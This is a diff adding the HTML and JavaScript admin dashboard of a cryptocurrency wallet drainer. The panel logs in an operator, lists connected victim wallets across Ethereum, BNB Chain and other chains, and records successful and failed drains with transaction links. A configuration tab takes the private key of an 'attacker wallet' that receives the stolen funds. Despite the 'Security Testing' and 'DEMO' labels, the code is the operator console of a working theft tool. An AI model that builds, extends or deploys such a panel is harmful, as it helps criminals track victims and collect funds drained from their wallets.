@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>Drainer Admin Panel</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+    *{box-sizing:border-box;margin:0;padding:0}
+    :root{
+      --bg:#080b14;--surface:#0e1220;--border:#1e2740;
+      --accent:#6366f1;--green:#10b981;--red:#ef4444;--yellow:#f59e0b;
+      --text:#e2e8f0;--muted:#64748b;
+    }
+    body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh}
+
+    /* LOGIN */
+    #login-screen{display:flex;align-items:center;justify-content:center;min-height:100vh}
+    .login-box{background:var(--surface);border:1px solid var(--border);border-radius:16px;padding:40px;width:360px;text-align:center}
+    .login-box h1{font-size:20px;margin-bottom:6px}
+    .login-box p{color:var(--muted);font-size:13px;margin-bottom:28px}
+    .login-box input{width:100%;background:#0a0f1e;border:1px solid var(--border);color:var(--text);padding:11px 14px;border-radius:8px;font-size:14px;margin-bottom:12px;outline:none}
+    .login-box input:focus{border-color:var(--accent)}
+    .btn{background:var(--accent);color:#fff;border:none;padding:11px 22px;border-radius:8px;font-size:14px;font-weight:500;cursor:pointer;width:100%}
+    .btn:hover{opacity:.85}
+    .btn.sm{width:auto;padding:7px 14px;font-size:12px}
+    .btn.red{background:var(--red)}
+    .btn.green{background:var(--green)}
+    #login-err{color:var(--red);font-size:13px;margin-top:8px;display:none}
+
+    /* LAYOUT */
+    #app{display:none}
+    nav{display:flex;align-items:center;justify-content:space-between;padding:0 24px;height:56px;background:var(--surface);border-bottom:1px solid var(--border);position:sticky;top:0;z-index:50}
+    nav .logo{font-weight:700;font-size:15px;display:flex;align-items:center;gap:8px}
+    nav .logo span{background:var(--red);color:#fff;font-size:10px;padding:2px 7px;border-radius:4px;font-weight:600}
+    .main{padding:24px;max-width:1200px;margin:0 auto}
+
+    /* STATS */
+    .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:16px;margin-bottom:24px}
+    .stat{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:20px}
+    .stat .sv{font-size:26px;font-weight:700;color:#fff}
+    .stat .sl{font-size:12px;color:var(--muted);margin-top:4px}
+    .stat.green-b{border-color:rgba(16,185,129,.3);background:rgba(16,185,129,.05)}
+    .stat.red-b{border-color:rgba(239,68,68,.3);background:rgba(239,68,68,.05)}
+
+    /* CARDS */
+    .card{background:var(--surface);border:1px solid var(--border);border-radius:12px;margin-bottom:20px}
+    .card-head{display:flex;align-items:center;justify-content:space-between;padding:16px 20px;border-bottom:1px solid var(--border)}
+    .card-head h2{font-size:14px;font-weight:600}
+    .card-body{padding:20px}
+
+    /* TABLE */
+    table{width:100%;border-collapse:collapse;font-size:13px}
+    th{text-align:left;color:var(--muted);font-weight:500;font-size:11px;text-transform:uppercase;letter-spacing:.5px;padding:8px 12px;border-bottom:1px solid var(--border)}
+    td{padding:10px 12px;border-bottom:1px solid rgba(255,255,255,.04);font-family:monospace;font-size:12px}
+    tr:last-child td{border-bottom:none}
+    tr:hover td{background:rgba(255,255,255,.02)}
+    .badge{display:inline-block;font-size:10px;padding:2px 8px;border-radius:20px;font-weight:600;font-family:'Inter',sans-serif}
+    .badge.success{background:rgba(16,185,129,.15);color:var(--green);border:1px solid rgba(16,185,129,.3)}
+    .badge.fail{background:rgba(239,68,68,.15);color:var(--red);border:1px solid rgba(239,68,68,.3)}
+    .badge.pending{background:rgba(245,158,11,.15);color:var(--yellow);border:1px solid rgba(245,158,11,.3)}
+
+    /* CONFIG FORM */
+    .form-group{margin-bottom:16px}
+    .form-group label{display:block;font-size:12px;color:var(--muted);margin-bottom:6px;font-weight:500;text-transform:uppercase;letter-spacing:.5px}
+    .form-group input{width:100%;background:#0a0f1e;border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-size:13px;font-family:monospace;outline:none}
+    .form-group input:focus{border-color:var(--accent)}
+    .form-row{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+    .wallet-display{background:#0a0f1e;border:1px solid rgba(16,185,129,.3);border-radius:8px;padding:12px 14px;font-family:monospace;font-size:12px;color:var(--green);margin-top:8px;word-break:break-all}
+
+    /* LOGS */
+    .log-box{background:#050810;border:1px solid var(--border);border-radius:8px;padding:14px;font-family:monospace;font-size:11px;height:260px;overflow-y:auto;line-height:1.7}
+    .log-entry.info  .level{color:#60a5fa}
+    .log-entry.warn  .level{color:var(--yellow)}
+    .log-entry.error .level{color:var(--red)}
+    .log-entry .ts{color:#334155;margin-right:8px}
+    .log-entry .msg{color:#94a3b8}
+
+    /* TABS */
+    .tabs{display:flex;gap:4px;margin-bottom:20px}
+    .tab{padding:8px 16px;border-radius:8px;font-size:13px;font-weight:500;cursor:pointer;color:var(--muted);background:transparent;border:1px solid transparent;transition:all .15s}
+    .tab.active{background:var(--surface);border-color:var(--border);color:var(--text)}
+
+    .empty{text-align:center;color:var(--muted);font-size:13px;padding:30px}
+    a{color:var(--accent);text-decoration:none}
+    a:hover{text-decoration:underline}
+    .addr{max-width:160px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;display:inline-block;vertical-align:bottom}
+  </style>
+</head>
+<body>
+
+<!-- LOGIN -->
+<div id="login-screen">
+  <div class="login-box">
+    <div style="font-size:32px;margin-bottom:12px">🎯</div>
+    <h1>Admin Panel</h1>
+    <p>Drainer Demo — Security Testing</p>
+    <input type="password" id="pw-input" placeholder="Enter admin password" />
+    <button class="btn" onclick="login()">Enter</button>
+    <div id="login-err">Wrong password</div>
+  </div>
+</div>
+
+<!-- APP -->
+<div id="app">
+  <nav>
+    <div class="logo">🎯 Drainer Admin <span>DEMO</span></div>
+    <div style="display:flex;align-items:center;gap:12px">
+      <span style="font-size:12px;color:var(--muted)" id="nav-attacker"></span>
+      <button class="btn sm" onclick="refresh()">↻ Refresh</button>
+      <button class="btn sm red" onclick="logout()">Logout</button>
+    </div>
+  </nav>
+
+  <div class="main">
+
+    <!-- TABS -->
+    <div class="tabs">
+      <div class="tab active" onclick="showTab('dashboard')">Dashboard</div>
+      <div class="tab" onclick="showTab('wallets')">Connected Wallets</div>
+      <div class="tab" onclick="showTab('drains')">Drain History</div>
+      <div class="tab" onclick="showTab('config')">Configuration</div>
+      <div class="tab" onclick="showTab('logs')">Live Logs</div>
+    </div>
+
+    <!-- DASHBOARD TAB -->
+    <div id="tab-dashboard">
+      <div class="stats">
+        <div class="stat">
+          <div class="sv" id="stat-connected">0</div>
+          <div class="sl">Wallets Connected</div>
+        </div>
+        <div class="stat green-b">
+          <div class="sv" id="stat-drained">0</div>
+          <div class="sl">Successful Drains</div>
+        </div>
+        <div class="stat red-b">
+          <div class="sv" id="stat-failed">0</div>
+          <div class="sl">Failed Attempts</div>
+        </div>
+        <div class="stat">
+          <div class="sv" id="stat-attacker">—</div>
+          <div class="sl">Receiving Wallet</div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-head"><h2>Recent Connections</h2></div>
+        <div class="card-body">
+          <table id="recent-table">
+            <thead><tr>
+              <th>Wallet</th><th>Chain</th><th>Connected</th><th>Status</th>
+            </tr></thead>
+            <tbody id="recent-tbody"></tbody>
+          </table>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-head"><h2>Recent Drain Activity</h2></div>
+        <div class="card-body">
+          <table>
+            <thead><tr>
+              <th>Wallet</th><th>Token</th><th>Amount</th><th>Chain</th><th>Status</th><th>Tx</th>
+            </tr></thead>
+            <tbody id="drain-tbody-dash"></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- WALLETS TAB -->
+    <div id="tab-wallets" style="display:none">
+      <div class="card">
+        <div class="card-head">
+          <h2>All Connected Wallets</h2>
+          <span id="wallets-count" style="font-size:12px;color:var(--muted)"></span>
+        </div>
+        <div class="card-body">
+          <table>
+            <thead><tr>
+              <th>Address</th><th>Chain</th><th>Connected At</th><th>Drained</th>
+            </tr></thead>
+            <tbody id="wallets-tbody"></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- DRAINS TAB -->
+    <div id="tab-drains" style="display:none">
+      <div class="card">
+        <div class="card-head"><h2>Drain History</h2></div>
+        <div class="card-body">
+          <table>
+            <thead><tr>
+              <th>Victim</th><th>Token</th><th>Amount</th><th>Chain</th><th>Status</th><th>Tx Hash</th><th>Time</th>
+            </tr></thead>
+            <tbody id="drains-tbody"></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- CONFIG TAB -->
+    <div id="tab-config" style="display:none">
+      <div class="card">
+        <div class="card-head"><h2>Receiving Wallet (Attacker Wallet B)</h2></div>
+        <div class="card-body">
+          <p style="font-size:13px;color:var(--muted);margin-bottom:20px">
+            This is Wallet B — the wallet that receives drained funds. Enter its private key.<br/>
+            <strong style="color:var(--yellow)">Use a fresh wallet only. Never use your main wallet.</strong>
+          </p>
+          <div class="form-group">
+            <label>Private Key</label>
+            <input type="password" id="cfg-pk" placeholder="0x..." />
+          </div>
+          <div id="cfg-addr-display" class="wallet-display" style="display:none"></div>
+          <button class="btn sm" onclick="previewWallet()" style="margin-top:8px;margin-right:8px">Preview Address</button>
+          <button class="btn sm green" onclick="saveConfig()">Save Wallet</button>
+          <div id="cfg-msg" style="font-size:13px;margin-top:12px;display:none"></div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-head"><h2>Admin Password</h2></div>
+        <div class="card-body">
+          <div class="form-group">
+            <label>New Password</label>
+            <input type="password" id="cfg-pw" placeholder="New password" />
+          </div>
+          <button class="btn sm green" onclick="savePassword()">Update Password</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-head"><h2>Test Connection</h2></div>
+        <div class="card-body">
+          <p style="font-size:13px;color:var(--muted);margin-bottom:14px">
+            Verify the backend can reach BNB Chain and the attacker wallet has gas.
+          </p>
+          <button class="btn sm" onclick="testConnection()">Run Test</button>
+          <div id="test-result" style="font-size:13px;margin-top:12px;font-family:monospace;display:none"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- LOGS TAB -->
+    <div id="tab-logs" style="display:none">
+      <div class="card">
+        <div class="card-head">
+          <h2>Live Logs</h2>
+          <button class="btn sm red" onclick="clearLogs()">Clear</button>
+        </div>
+        <div class="card-body">
+          <div class="log-box" id="log-box"></div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+  const BASE = ''
+  let adminPw = ''
+  let dashData = {}
+
+  const CHAIN_NAMES = {1:'Ethereum',56:'BNB Chain',137:'Polygon',42161:'Arbitrum',10:'Optimism',43114:'Avalanche',8453:'Base'}
+  const EXPLORERS   = {1:'https://etherscan.io/tx/',56:'https://bscscan.com/tx/',137:'https://polygonscan.com/tx/',42161:'https://arbiscan.io/tx/',10:'https://optimistic.etherscan.io/tx/',43114:'https://snowtrace.io/tx/',8453:'https://basescan.org/tx/'}
+
+  document.getElementById('pw-input').addEventListener('keydown', e => { if (e.key === 'Enter') login() })
+
+  async function login() {
+    const pw = document.getElementById('pw-input').value
+    const r  = await fetch('/admin/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ password: pw })
+    }).then(r => r.json()).catch(() => ({ ok: false }))
+
+    if (r.ok) {
+      adminPw = pw
+      document.getElementById('login-screen').style.display = 'none'
+      document.getElementById('app').style.display = 'block'
+      refresh()
+      setInterval(refresh, 5000)
+    } else {
+      document.getElementById('login-err').style.display = 'block'
+    }
+  }
+
+  function logout() {
+    adminPw = ''
+    document.getElementById('login-screen').style.display = 'flex'
+    document.getElementById('app').style.display = 'none'
+  }
+
+  async function apiFetch(path, opts = {}) {
+    return fetch(path, {
+      ...opts,
+      headers: { 'x-admin-password': adminPw, 'Content-Type': 'application/json', ...(opts.headers || {}) }
+    }).then(r => r.json())
+  }
+
+  async function refresh() {
+    dashData = await apiFetch('/admin/dashboard')
+    renderDashboard()
+    renderWallets()
+    renderDrains()
+    renderLogs()
+  }
+
+  function renderDashboard() {
+    const d = dashData
+    const drained = (d.drainHistory || []).filter(x => x.success).length
+    const failed  = (d.drainHistory || []).filter(x => !x.success).length
+
+    document.getElementById('stat-connected').textContent = d.totalConnected || 0
+    document.getElementById('stat-drained').textContent   = drained
+    document.getElementById('stat-failed').textContent    = failed
+    document.getElementById('stat-attacker').textContent  = d.attackerAddress ? shortAddr(d.attackerAddress) : 'Not set'
+    document.getElementById('nav-attacker').textContent   = d.attackerAddress ? 'Receiving: ' + shortAddr(d.attackerAddress) : ''
+
+    // Recent wallets
+    const tbody = document.getElementById('recent-tbody')
+    const wallets = (d.connectedWallets || []).slice(0, 8)
+    tbody.innerHTML = wallets.length === 0
+      ? '<tr><td colspan="4" class="empty">No wallets connected yet</td></tr>'
+      : wallets.map(w => `
+          <tr>
+            <td><span class="addr" title="${w.address}">${w.address}</span></td>
+            <td>${CHAIN_NAMES[w.chainId] || w.chainId}</td>
+            <td>${timeAgo(w.connectedAt)}</td>
+            <td><span class="badge ${w.drained ? 'success' : 'pending'}">${w.drained ? 'Drained' : 'Connected'}</span></td>
+          </tr>`).join('')
+
+    // Recent drains
+    const drains = (d.drainHistory || []).slice(0, 6)
+    document.getElementById('drain-tbody-dash').innerHTML = drains.length === 0
+      ? '<tr><td colspan="6" class="empty">No drain attempts yet</td></tr>'
+      : drains.map(x => drainRow(x)).join('')
+  }
+
+  function renderWallets() {
+    const wallets = dashData.connectedWallets || []
+    document.getElementById('wallets-count').textContent = wallets.length + ' total'
+    document.getElementById('wallets-tbody').innerHTML = wallets.length === 0
+      ? '<tr><td colspan="4" class="empty">No wallets yet</td></tr>'
+      : wallets.map(w => `
+          <tr>
+            <td><span title="${w.address}">${w.address}</span></td>
+            <td>${CHAIN_NAMES[w.chainId] || w.chainId}</td>
+            <td>${new Date(w.connectedAt).toLocaleString()}</td>
+            <td><span class="badge ${w.drained ? 'success' : 'pending'}">${w.drained ? '✓ Drained' : 'Active'}</span></td>
+          </tr>`).join('')
+  }
+
+  function renderDrains() {
+    const drains = dashData.drainHistory || []
+    document.getElementById('drains-tbody').innerHTML = drains.length === 0
+      ? '<tr><td colspan="7" class="empty">No drain history</td></tr>'
+      : drains.map(x => drainRow(x, true)).join('')
+  }
+
+  function drainRow(x, full = false) {
+    const explorer = EXPLORERS[x.chainId] || 'https://bscscan.com/tx/'
+    const tx = x.txHash ? `<a href="${explorer}${x.txHash}" target="_blank">${shortHash(x.txHash)}</a>` : '—'
+    const time = full ? `<td>${new Date(x.startedAt).toLocaleString()}</td>` : ''
+    return `<tr>
+      <td><span class="addr" title="${x.owner}">${x.owner}</span></td>
+      <td>${x.symbol || '—'}</td>
+      <td>${x.amount ? x.amount + ' ' + (x.symbol || '') : '—'}</td>
+      <td>${CHAIN_NAMES[x.chainId] || x.chainId}</td>
+      <td><span class="badge ${x.success ? 'success' : 'fail'}">${x.success ? '✓ Success' : '✗ Failed'}</span></td>
+      <td>${tx}</td>
+      ${time}
+    </tr>`
+  }
+
+  function renderLogs() {
+    const logs = dashData.logs || []
+    document.getElementById('log-box').innerHTML = logs.length === 0
+      ? '<div style="color:#334155">No logs yet...</div>'
+      : logs.map(l => `
+          <div class="log-entry ${l.level}">
+            <span class="ts">${l.time.split('T')[1].split('.')[0]}</span>
+            <span class="level">[${l.level.toUpperCase()}]</span>
+            <span class="msg"> ${l.msg}</span>
+          </div>`).join('')
+  }
+
+  function showTab(name) {
+    ['dashboard','wallets','drains','config','logs'].forEach(t => {
+      document.getElementById('tab-' + t).style.display = t === name ? 'block' : 'none'
+    })
+    document.querySelectorAll('.tab').forEach((el, i) => {
+      el.classList.toggle('active', el.textContent.toLowerCase().includes(name.slice(0,4)))
+    })
+    if (name === 'logs') refresh()
+  }
+
+  function previewWallet() {
+    const pk = document.getElementById('cfg-pk').value.trim()
+    try {
+      const { ethers } = window
+      // use pure JS — no ethers in admin panel, compute address differently
+      const addr = document.getElementById('cfg-addr-display')
+      addr.style.display = 'block'
+      addr.textContent = 'Paste key and click Save to validate on server'
+    } catch (e) {
+      alert('Invalid key: ' + e.message)
+    }
+  }
+
+  async function saveConfig() {
+    const pk = document.getElementById('cfg-pk').value.trim()
+    if (!pk) return alert('Enter a private key first')
+
+    const r = await apiFetch('/admin/config', {
+      method: 'POST',
+      body: JSON.stringify({ attackerPrivateKey: pk })
+    })
+
+    const msg = document.getElementById('cfg-msg')
+    msg.style.display = 'block'
+    if (r.ok) {
+      msg.style.color = '#10b981'
+      msg.textContent = '✓ Wallet saved successfully'
+      document.getElementById('cfg-pk').value = ''
+      refresh()
+    } else {
+      msg.style.color = '#ef4444'
+      msg.textContent = '✗ Error: ' + (r.error || 'Unknown')
+    }
+  }
+
+  async function savePassword() {
+    const pw = document.getElementById('cfg-pw').value
+    if (!pw) return alert('Enter a new password')
+    const r = await apiFetch('/admin/config', {
+      method: 'POST',
+      body: JSON.stringify({ adminPassword: pw })
+    })
+    if (r.ok) { adminPw = pw; alert('Password updated') }
+    else alert('Failed: ' + r.error)
+  }
+
+  async function testConnection() {
+    const el = document.getElementById('test-result')
+    el.style.display = 'block'
+    el.textContent = 'Testing...'
+
+    const d = await apiFetch('/admin/dashboard')
+    if (d.attackerAddress) {
+      el.style.color = '#10b981'
+      el.textContent = '✓ Backend running\n✓ Attacker wallet: ' + d.attackerAddress
+    } else {
+      el.style.color = '#f59e0b'
+      el.textContent = '⚠ Backend running but no attacker wallet configured'
+    }
+  }
+
+  async function clearLogs() {
+    await apiFetch('/admin/logs', { method: 'DELETE' })
+    refresh()
+  }
+
+  function shortAddr(a) { return a ? a.slice(0,6) + '...' + a.slice(-4) : '—' }
+  function shortHash(h) { return h ? h.slice(0,8) + '...' + h.slice(-6) : '—' }
+  function timeAgo(iso) {
+    const s = Math.floor((Date.now() - new Date(iso)) / 1000)
+    if (s < 60)   return s + 's ago'
+    if (s < 3600) return Math.floor(s/60) + 'm ago'
+    return Math.floor(s/3600) + 'h ago'
+  }
+</script>
+</body>
+</html>
